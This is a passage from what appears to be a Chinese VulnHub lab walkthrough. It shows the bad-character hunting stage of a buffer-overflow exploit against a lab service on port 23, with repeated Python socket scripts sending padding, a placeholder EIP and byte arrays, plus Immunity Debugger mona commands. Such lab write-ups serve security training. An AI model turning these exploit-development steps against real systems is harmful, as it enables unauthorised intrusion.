+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4e\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style=color:#cd5555>&#34;</span>)
+</span></span><span style=display:flex><span>buff = <span style=color:#cd5555>&#34;A&#34;</span>*<span style=color:#b452cd>1902</span>
+</span></span><span style=display:flex><span>eip = <span style=color:#cd5555>&#34;B&#34;</span> * <span style=color:#b452cd>4</span>
+</span></span><span style=display:flex><span>buffer = badchars
+</span></span><span style=display:flex><span>nullByte = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x00</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span>inputBuffer = buff + eip + buffer + nullByte
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p>执行<code>!mona compare -a esp -f "D:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin"</code></p><p><img src=https://www.vulnhub.cn/walkthrough/613/13.webp alt=13></p><pre tabindex=0><code>!mona bytearray -cpb \x00\x4d\x4f\x5f
+</code></pre><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#228b22>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>socket</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>ip = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span>port = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span>badchars = (<span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4e\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60\x61\x62\x63</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style=color:#cd5555>&#34;</span>)
+</span></span><span style=display:flex><span>buff = <span style=color:#cd5555>&#34;A&#34;</span>*<span style=color:#b452cd>1902</span>
+</span></span><span style=display:flex><span>eip = <span style=color:#cd5555>&#34;B&#34;</span> * <span style=color:#b452cd>4</span>
+</span></span><span style=display:flex><span>buffer = badchars
+</span></span><span style=display:flex><span>nullByte = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x00</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span>inputBuffer = buff + eip + buffer + nullByte
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p>再次执行<code>!mona compare -a esp -f "D:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin"</code></p><p><img src=https://www.vulnhub.cn/walkthrough/613/14.webp alt=14></p><pre tabindex=0><code>!mona bytearray -cpb \x00\x4d\x4f\x5f\x79
+</code></pre><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#228b22>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>socket</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>ip = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span>port = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span>badchars = (<span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4e\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60\x61\x62\x63</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style=color:#cd5555>&#34;</span>)
+</span></span><span style=display:flex><span>buff = <span style=color:#cd5555>&#34;A&#34;</span>*<span style=color:#b452cd>1902</span>
+</span></span><span style=display:flex><span>eip = <span style=color:#cd5555>&#34;B&#34;</span> * <span style=color:#b452cd>4</span>
+</span></span><span style=display:flex><span>buffer = badchars
+</span></span><span style=display:flex><span>nullByte = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x00</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span>inputBuffer = buff + eip + buffer + nullByte
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p>再次执行<code>!mona compare -a esp -f "D:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin"</code></p><p><img src=https://www.vulnhub.cn/walkthrough/613/15.webp alt=15></p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>!mona bytearray -cpb <span style=color:#cd5555>\x</span>00<span style=color:#cd5555>\x</span>4d<span style=color:#cd5555>\x</span>4f<span style=color:#cd5555>\x</span>5f<span style=color:#cd5555>\x</span>79<span style=color:#cd5555>\x</span>7e
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#228b22>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>socket</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>ip = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span>port = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span>badchars = (<span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4e\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60\x61\x62\x63</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x7a\x7b\x7c\x7d\x7f\x80\x81\x82\x83\x84\x85</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style=color:#cd5555>&#34;</span>)
+</span></span><span style=display:flex><span>buff = <span style=color:#cd5555>&#34;A&#34;</span>*<span style=color:#b452cd>1902</span>
+</span></span><span style=display:flex><span>eip = <span style=color:#cd5555>&#34;B&#34;</span> * <span style=color:#b452cd>4</span>
+</span></span><span style=display:flex><span>buffer = badchars
+</span></span><span style=display:flex><span>nullByte = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x00</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span>inputBuffer = buff + eip + buffer + nullByte
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p>执行<code>!mona compare -a esp -f "D:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin"</code></p><p><img src=https://www.vulnhub.cn/walkthrough/613/16.webp alt=16></p><pre tabindex=0><code>!mona bytearray -cpb \x00\x4d\x4f\x5f\x79\x7e\x7f
+</code></pre><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
